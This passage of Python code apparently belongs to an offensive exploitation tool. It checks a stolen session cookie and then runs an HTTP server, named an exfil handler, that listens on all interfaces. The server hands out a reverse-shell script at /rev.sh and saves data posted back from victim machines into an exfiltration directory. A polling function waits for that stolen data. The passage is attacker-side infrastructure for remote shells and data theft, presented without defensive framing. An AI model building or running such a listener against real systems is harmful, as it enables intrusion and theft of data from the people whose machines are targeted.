        else:
            print("[!] Authentication may be invalid. Cookie may be expired.")
            print(f"    snippet: {clean(r.text, 500)}")

    except Exception as e:
        print(f"[-] Auth check failed: {e}")


class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


class ExfilHandler(http.server.BaseHTTPRequestHandler):
    def _save(self, body):
        name = self.path.split("?")[0].strip("/") or "root"
        safe = re.sub(r"[^A-Za-z0-9._-]", "_", name)

        if safe in ("rev.sh", "r", "r.sh", "favicon.ico"):
            return

        os.makedirs(EXFILDIR, exist_ok=True)
        fname = os.path.join(EXFILDIR, safe)

        with open(fname, "ab") as f:
            f.write(body)

        print(f"[HTTP] Saved {len(body)} bytes -> {fname}")

    def _reply(self, body=b"ok", ctype="text/plain"):
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = self.path.split("?")[0]

        if path in ("/rev.sh", "/r", "/r.sh"):
            self._reply(REV_SCRIPT.encode(), "text/plain")
        else:
            self._save(b"")
            self._reply()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length) if length else b""
        self._save(body)
        self._reply()

    def log_message(self, *args):
        pass


def start_http_server(port):
    try:
        srv = ThreadingHTTPServer(("0.0.0.0", port), ExfilHandler)
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.start()
        print(f"[*] HTTP exfil / rev.sh server listening on 0.0.0.0:{port}")
        return srv
    except Exception as e:
        print(f"[-] Could not start HTTP server on port {port}: {e}")
        print("    Make sure you are not running nc on that port.")
        return None


def wait_exfil(token, timeout=8):
    fname = os.path.join(EXFILDIR, token)
    end = time.time() + timeout

    while time.time() < end:
        if os.path.exists(fname) and os.path.getsize(fname) > 0:
            return fname
        time.sleep(0.2)

    return None


